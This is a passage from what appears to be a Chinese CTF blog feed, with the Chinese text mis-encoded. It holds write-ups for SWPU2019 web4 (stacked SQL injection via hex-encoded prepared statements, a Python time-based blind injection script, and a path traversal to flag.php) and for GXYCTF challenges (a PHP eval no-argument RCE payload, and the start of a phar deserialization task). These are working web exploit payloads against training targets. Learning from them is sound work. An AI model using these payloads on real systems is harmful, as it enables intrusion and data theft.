class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1, (select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>æ˜¨å¤©æ™šä¸Šå†™äº†å†™web1,æŠ˜è…¾çš„å¤Ÿå‘›ã€‚ä»Šå¤©åœ¨å¤ç°web4æ—¶ä¹ŸæŒºéš¾å—çš„ï¼Œæ‰€å¹¸æœ€åè¿˜æ˜¯åšå‡ºæ¥äº†ã€‚<br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ç™»å½•æ¡†"><br>é¢˜ç›®æ‰€ç»™defæ³¨å†ŒåŠŸèƒ½å¹¶æ²¡æœ‰å¼€æ”¾ï¼Œè€Œç™»å½•é”®ç‚¹äº†ä¹Ÿæ²¡æœ‰ååº”ã€‚æŠ“åŒ…çš„è¯ä¼šæœ‰æ–°å‘ç°ï¼š<img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="æ³¨å…¥"><br>å¦‚æœåªæœ‰å•å¼•å·çš„è¯ï¼Œä¼šæŠ¥é”™ã€‚ä½†æ˜¯å¦‚æœè¾“å…¥ç»“æœé™¤äº†å•å¼•å·è¿˜æœ‰åˆ†å·çš„è¯ï¼Œè¿”å›çš„ä»æ˜¯202ã€‚è¿™ä»£è¡¨äº†ä»€ä¹ˆå‘¢ï¼Ÿé¦–å…ˆå¯ä»¥ç¡®è®¤æ˜¯æ³¨å…¥ï¼ŒåŒæ—¶è¿˜å¯ä»¥å¤§è‡´åˆ¤æ–­æ˜¯å †å æ³¨å…¥ã€‚<br>å…³äºå †å æ³¨å…¥æˆ‘å¹¶æ²¡æœ‰ä»€ä¹ˆäº†è§£ã€‚äºæ˜¯å»æœç´¢äº†ä¸‹ï¼Œå‘ç°è¿™å‡ å¹´å¼€å§‹æœ‰å †å æ³¨å…¥çš„ctfé¢˜åœ¨å„å¤§èµ›äº‹ä¸­å‡ºç°ã€‚å…¶ç‰¹ç‚¹æ— éæ˜¯ï¼šé™åˆ¶äº†å¸¸ç”¨çš„select,updateç­‰ç­‰å…³é”®è¯­å¥ã€‚ä½†æ˜¯å´æ²¡æœ‰é™åˆ¶ä½ çš„åˆ†å·ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ä¸€æ¬¡æ‰§è¡Œå¤šæ¡sqlè¯­å¥ã€‚è€Œå¦‚æœé€‚å½“æ­é…ï¼Œä¸€æ ·å¯ä»¥èµ·åˆ°æ³¨å…¥çš„æ•ˆæœã€‚<br>æ ¹æ®å®˜æ–¹çš„è¯´æ³•ï¼Œè¿™æ˜¯å±äºPDOåœºæ™¯ä¸‹çš„sqlæ³¨å…¥ï¼Œå‡ºé¢˜äººç»™çš„æ–¹æ³•å°±æ˜¯ç”¨16è¿›åˆ¶åŠ mysqlé¢„å¤„ç†æ¥è§£å†³ã€‚å…¶payloadå¤§è‡´æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @a&#x3D;0x&#123;0&#125;;PREPARE ctftest from @a;execute ctftest;</span><br></pre></td></tr></table></figure><p>å‰é¢çš„@aå³ä¸ºæˆ‘ä»¬æ‰€éœ€çš„æ³¨å…¥è¯­å¥çš„16è¿›åˆ¶å˜é‡ï¼Œåé¢<code>PREPARE ctftest from @a;execute ctftest;</code>ä¸¤å¥èµ·åˆ°äº†å®šä¹‰å¹¶æ‰§è¡Œé¢„å¤„ç†è¯­å¥çš„ä½œç”¨<br>é‚£ä¹ˆç›²æ³¨è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://094a7801-436a-4a50-9b73-ea921af6361c.node3.buuoj.cn/index.php?r=Login/Login"</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> str1 <span class="keyword">in</span> <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``."</span>:</span><br><span class="line">        sql = <span class="string">"select if((ascii(substr((select group_concat(flag) from flag),"</span>+str(i)+<span class="string">",1))='"</span>+str(ord(str1))+<span class="string">"'),sleep(6),2);"</span>   <span class="comment"># ctf</span></span><br><span class="line">        sql_hex = str_to_hex(sql)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">"username"</span>:<span class="string">"1\';SET @a=0x"</span>+str(sql_hex)+<span class="string">";PREPARE st FROM @a;EXECUTE st;"</span>,</span><br><span class="line">            <span class="string">"password"</span>:<span class="string">"123"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result=requests.post(url,json=data,timeout=<span class="number">6</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#glzjinwantsaliendzip</span></span><br><span class="line"><span class="comment">#glzjinnts_a_girl_friendzip</span></span><br><span class="line"><span class="comment">#glzjinwantsgirliendzip</span></span><br><span class="line"><span class="comment">#glzjin_wants_a_girl_friend.zip</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯èƒ½ç”±äºbuuojçš„é—®é¢˜å§ï¼Œè®¿é—®è¿‡å¿«ç›´æ¥429,å¯¼è‡´æ¯æ¬¡è·‘å‡ºçš„ç»“æœéƒ½ä¸ä¸€æ ·ã€‚æœ€åæ±‡æ€»ä¸‹æ‰æ¨æ–­å‡ºæ¥æ˜¯glzjin_wants_a_girl_friend.zipã€‚(è¿™é‡Œç›´æ¥select flag from flagäº†ï¼Œå®åœ¨ä¸æƒ³åˆå»çˆ†è¡¨çˆ†åˆ—äº†ã€‚ã€‚ï¼‰<br>æ‹¿åˆ°æºç ï¼Œå®¡è®¡ä¸æäº†ã€‚ç›´æ¥è¯´å‡ºé¢˜äººæ€è·¯å§ï¼š<br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/5.jpg" class="lazyload" data-srcset="5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å®¡è®¡"><br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/6.jpg" class="lazyload" data-srcset="6.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="åˆ©ç”¨"><br>å‘ç°ä¼šè¯»å–img_fileå†…å®¹å¹¶ä»¥base64è¾“å‡ºã€‚é‚£ä¹ˆåªè¦img_fileåŒ…å«flag.phpå°±å¥½äº†ã€‚<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r&#x3D;User&#x2F;Index&amp;img_file&#x3D;&#x2F;..&#x2F;flag.php</span><br></pre></td></tr></table></figure><p>å³å¯ä»æºç å¤„è§£ç æ‹¿åˆ°flag<br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/7.jpg" class="lazyload" data-srcset="7.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF--ç¦æ­¢å¥—å¨ƒ&amp;BabaySqli-v3.0</title>
      <link href="2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&amp;BabaySqli-v3.0/"/>
      <url>2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&amp;BabaySqli-v3.0/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©ä¹Ÿæ¥æ¥ç€åšä¸‹GXYçš„å‡ é“webé¢˜</p><h1 id="ç¦æ­¢å¥—å¨ƒ"><a href="#ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="ç¦æ­¢å¥—å¨ƒ"></a>ç¦æ­¢å¥—å¨ƒ</h1><p>é¦–å…ˆæ˜¯ç¦æ­¢å¥—å¨ƒè¿™ä¸€é“ï¼Œé¢˜ç›®ç±»å‹ä¸ºæ— å‚RCEã€‚æˆ‘ä¹Ÿæ˜¯é€šè¿‡è¿™ä¸€é“é¢˜æ‰äº†è§£åˆ°æ— å‚RCEè¿™ä¸ªåè¯ï¼Œä¸è¿‡åæ¥ä»”ç»†æƒ³æƒ³ï¼ŒåŸæ¥åšè¿‡çš„BugKuçš„è¿‡ç‹—ä¸€å¥è¯ä¹Ÿæœ‰ç›¸ä¼¼ä¹‹å¤„â€¦â€¦</p><p>è¯ä¸å¤šè¯´ï¼Œå…ˆç»™å‡ºæˆ‘å‚è€ƒçš„æ–‡ç« ï¼š</p><a id="more"></a><p><a href="https://www.gem-love.com/websecurity/530.html" target="_blank" rel="noopener">https://www.gem-love.com/websecurity/530.html</a><br>å‰é¢çš„å¸ˆå‚…é‡Œé¢æåˆ°äº†skyå¸ˆå‚…çš„åšæ–‡ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿå‚è€ƒäº†ä¸‹ã€‚</p><p>é‚£ä¹ˆé¦–å…ˆï¼Œå‡ºç°æ— å‚RCEçš„å¿…è¦æ¡ä»¶æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå¤§æŠµæ˜¯å¦‚ä¸‹çš„æ­£åˆ™ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    </span><br><span class="line">    eval($_GET[&#39;code&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ?Ræ˜¯å¼•ç”¨å½“å‰è¡¨è¾¾å¼çš„æ„æ€ï¼Œé‚£ä¹ˆé…ä¸Šå‰é¢çš„æˆåˆ†ï¼Œæˆ‘ä»¬è¢«å…è®¸çš„å‚æ•°å€¼å¿…é¡»å…·æœ‰ä»¥ä¸‹å½¢å¼ï¼š<br>a(b(c())<br>a()<br>è€Œä¸æ˜¯a(â€˜342â€™)ä¹‹ç±»çš„ã€‚</p><p>é‚£ä¹ˆå›åˆ°é¢˜ç›®ä¸Šæ¥ï¼Œé¦–å…ˆç½‘é¡µå¹¶æ²¡æœ‰å¤ªå¤šä¿¡æ¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¸¸è§„å‡ æ¿æ–§æ‹¿å‡ºæ¥ï¼š1.æŠ“åŒ…ï¼Œæœ‰æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ï¼Ÿ2.ç½‘é¡µæºç ï¼Œæœ‰æ²¡æœ‰æç¤ºï¼Ÿ3.æºç æ³„éœ²ï¼Œgit,svnç­‰ç­‰è¯•ä¸€é4.æ‰«ç›®å½•ï¼Œçœ‹æœ‰æ²¡æœ‰æœ‰è¶£çš„ç›®å½•å¯ä»¥å‘æ˜5.å®åœ¨ä¸è¡Œçœ‹çœ‹é¢˜ç›®çš„åå­—ï¼Œç½‘é¡µçš„æ¡†æ¶ï¼Œæœ‰æ²¡æœ‰æç¤ºä½ å¯èƒ½å­˜åœ¨çš„æ¼æ´  ã€‚æˆ‘ä¸ªäººè®¤ä¸ºæ­£å¸¸çš„é¢˜ç›®è¿™æ ·åšè‚¯å®šå¯ä»¥ç»§ç»­å‘å±•ä¸‹å»è€Œä¸è‡³äºä¸€ç­¹è«å±•ã€‚<br>å½“ç„¶ï¼Œæ­¤å¤„æ˜¯å¾ˆå¸¸è§çš„.gitæºç æ³„éœ²ï¼Œæˆ‘ä»¬æŠŠgithackæ‹¿ä¸‹æ¥çš„index.phpçœ‹ä¸€çœ‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ°è¿™å°±å¯ä»¥ç¡®è®¤æ˜¯æ— å‚RCEäº†ï¼Œé‚£ä¹ˆç°åœ¨æ¥å°ç»“ä¸‹å¦‚ä½•åº”å¯¹æ— å‚RCEä»¥åŠå¦‚ä½•è¿‡è¿™é‡Œçš„æ­£åˆ™ï¼š<br>é¦–å…ˆæ˜ç¡®ä¸€ç‚¹ï¼ŒåŸºäºæ— å‚RCEçš„æ ¼å¼è¦æ±‚ï¼Œæˆ‘ä»¬å¯åˆ©ç”¨çš„æœ‰å¾ˆå¤šï¼Œå…¶ä¸­ä¸»è¦åŒ…æ‹¬å…¨å±€å˜é‡ä»¥åŠè¿”å›å€¼æœ‰ç‰¹æ®Šæ€§çš„å‡½æ•°ã€‚ç”šè‡³å¯ä»¥åƒskyé‚£æ ·ï¼Œé€šè¿‡getallheaders()æ‹¿åˆ°ç¯å¢ƒå˜é‡ï¼Œä½¿è‡ªå·±ä¼ å‚çš„å‚æ•°å˜ä¸ºå¯æ§çš„ï¼Œè¿›è€Œæ‰§è¡Œå‘½ä»¤ã€‚<br>é‚£ä¹ˆå›åˆ°é¢˜ç›®ä¸Šï¼Œç°åœ¨è‚¯å®šç¬¬ä¸€æ­¥æ˜¯çœ‹çœ‹ç›®å½•äº†ï¼Œä»skyé‚£å­¦åˆ°çš„å¸¸è§„æ‰‹æ³•ï¼Œæ˜¯getcwd()è·å¾—å½“å‰ç›®å½•ï¼Œscandir(getcwd())è·å¾—å½“å‰ç›®å½•çš„æ–‡ä»¶ã€‚è€Œå¦‚æœè¦å¾€ä¸Šå±‚ç›®å½•çœ‹çš„è¯ï¼Œå°±åˆ©ç”¨dirname()ï¼Œä½¿ç”¨scandir(dirname(getcwd()))ã€‚ä¸è¿‡è¿™é‡Œæˆ‘è¯•äº†ä¸‹å¥½åƒä¸å¤ªè¡Œï¼Œæ‰€ä»¥æ”¹ç”¨å…¶ä»–æ–¹æ³•ï¼š<br>æˆ‘ä»¬çŸ¥é“ï¼Œscandir()è¯»å½“å‰ç›®å½•çš„ç”¨æ³•æ˜¯scandir(â€˜.â€™),ä½†è¿™é‡Œçš„â€™.â€™è¦æ€ä¹ˆè·å¾—å‘¢ï¼Ÿé‚£å°±è¦æ¶‰åŠåˆ°ä¸€ä¸ªé«˜çº§ç”¨æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">current(localeconv())</span><br></pre></td></tr></table></figure><p>æœ¬åœ°è¯•ä¸€ä¸‹ç»“æœï¼š<br><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="localeconv"><br><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="current(localeconv)"><br>åè€…ä¹‹è¿”å›ä¸€ä¸ªç‚¹ï¼Œæ˜¯å®Œå…¨å¯ä»¥åˆ©ç”¨äº†ã€‚<br>æ‰«ç›®å½•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="dir"></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±è¦è¯»flag.phpäº†ï¼Œè¿™é‡Œæˆ‘ä»¬å½“ç„¶åªèƒ½åˆ©ç”¨flag.phpåœ¨è¿”å›çš„æ•°ç»„ä¸­çš„é”®å€¼æ¥æ“ä½œä¸‹ã€‚å¦‚æœflag.phpæ˜¯æ•°ç»„æœ€åä¸€ä¸ªæ•°å€¼çš„è¯ï¼Œç›´æ¥end()å°±è§£å†³äº†ã€‚ä¸è¿‡è¿™é‡Œæ˜¯å€’æ•°ç¬¬äºŒä¸ªï¼Œæ‰€ä»¥æœ‰å…¶ä»–æ–¹æ³•æ“ä½œï¼š<br>1.è¿æ°”æ³•<br>hhhå› ä¸ºæ˜¯é éšæœºæ•°ï¼Œæˆ‘è®¤ä¸ºå¹²è„†å«è¿æ°”ä½¿ç„¶å¥½äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_rand(array_flip(scandir(current(localeconv()))))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œarray_rand()ä¸å¤šè¯´ï¼Œå°±æ˜¯éšæœºè·å¾—æ•°ç»„ä¸­ä¸€ä¸ªä¸‹æ ‡ï¼Œè€Œarray_flipåˆ™å¯ä»¥äº¤æ¢é”®ä¸å€¼ã€‚é‚£ä¹ˆè¿”å›çš„å°±å˜æˆå€¼äº†ã€‚<br>å› ä¸ºè¿™é‡Œåªæœ‰äº”ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬ç”¨éšæœºæ•°å®Œå…¨ä¸ç”¨å…³å¿ƒå…¶éšæœºæ€§ã€‚</p><p>2.ä½¿ç”¨array_reverseåŠ ä¸Šnext()ï¼ŒæŠŠæ•°ç»„é€†è¿‡æ¥åï¼Œflag.phpå˜æˆç¬¬äºŒä¸ªå…ƒç´ ï¼Œæ°å·§æ˜¯æ•°ç»„åæŒ‡é’ˆä¸‹ä¸€ä¸ªï¼Œä½¿ç”¨next()å³å¯ã€‚</p><p>æœ€åï¼Œä½¿ç”¨readfile()æˆ–highlight_fileè¯»æ–‡ä»¶å³å¯<br>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp=print_r(readfile(array_rand(array_flip(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure><h1 id="BabySqli-v3-0"><a href="#BabySqli-v3-0" class="headerlink" title="BabySqli v3.0"></a>BabySqli v3.0</h1><p>pharååºåˆ—åŒ–çš„é¢˜ç›®ã€‚å…¶å®ä»å»å¹´10æœˆä»½åˆ°ç°åœ¨è‡ªå·±å·²ç»å¬è¿‡æ— æ•°æ¬¡pharååºåˆ—åŒ–çš„æ¼æ´äº†ï¼Œè€Œä¸”å­¦æ ¡é‡Œå¸ˆå‚…ä»¬ä¹Ÿä¸€ç›´åœ¨æ•´ç›¸å…³çš„popé“¾ä»€ä¹ˆçš„ï¼Œå› æ­¤å¯’å‡ä¸€å®šè¦è§£å†³è¿™ä¸ªçŸ¥è¯†ç‚¹ï¼ˆå¥½åƒå·²ç»æ¬ äº†ä¸å°‘çŸ¥è¯†â€¦â€¦ssrfä»å»å¹´8æœˆåˆ°ç°åœ¨è¿˜æ²¡æœ‰ç³»ç»Ÿçš„å¥½å¥½å­¦è¿‡â€¦â€¦ï¼‰</p><p>è¿™é“é¢˜ä¹Ÿç®—æ˜¯è‡ªå·±çš„ç¬¬ä¸€é“pharååºåˆ—åŒ–çš„é¢˜ç›®å§ï¼Œæ•´ä½“ä¸ç®—éš¾ã€‚<br>ä¸è¿‡æ¯”èµ›æ—¶çš„å¸ˆå‚…ä»¬å¯èƒ½ä¸è¿™ä¹ˆæƒ³ï¼Œå› ä¸ºè¿™é“é¢˜çš„åå­—å®¹æ˜“æŠŠäººå¼•å‘sqlæ³¨å…¥ä¸Šï¼Œä½†å…¶å®ç™»å½•ç•Œé¢å°±æ˜¯ä¸ªå¼±å£ä»¤admin passwordã€‚ä¼°è®¡å‘äº†ä¸å°‘äººå§ã€‚</p><p>ç™»å½•è¿›å»åï¼Œçœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ (ç°åœ¨çš„æ–‡ä»¶ä¸Šä¼ é¢˜å¾ˆå¤šå°±æ˜¯pharçš„çŸ¥è¯†ç‚¹ï¼Œæ¯”å¦‚çº¢å¸½æ¯)<br><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ä¸Šä¼ "></p><p>åŒæ—¶æ³¨æ„åˆ°æœ‰fileå‚æ•°ä¸ºuploadï¼Œå¯èƒ½æ˜¯ä¸ªæ–‡ä»¶åŒ…å«çš„ç‚¹ã€‚å› æ­¤æˆ‘ä»¬å°è¯•ä¸€ä¸‹è®¿é—®ï¼Œå‘ç°ç¡®å®å­˜åœ¨upload.php.åŒç†ï¼Œå¯ä»¥ç¡®è®¤æœ‰flag.phpã€‚ä½†æ˜¾ç„¶è¢«banäº†ã€‚å› æ­¤å†å›åˆ°fileå‚æ•°ä¸Šï¼Œé™¤äº†ç›´æ¥çš„æ–‡ä»¶åŒ…å«ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨ä¼ªåè®®è¯•è¯•ï¼Œäºæ˜¯æˆåŠŸæ‹¿åˆ°home.phpæºç ã€‚è§£ç åå¾—ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 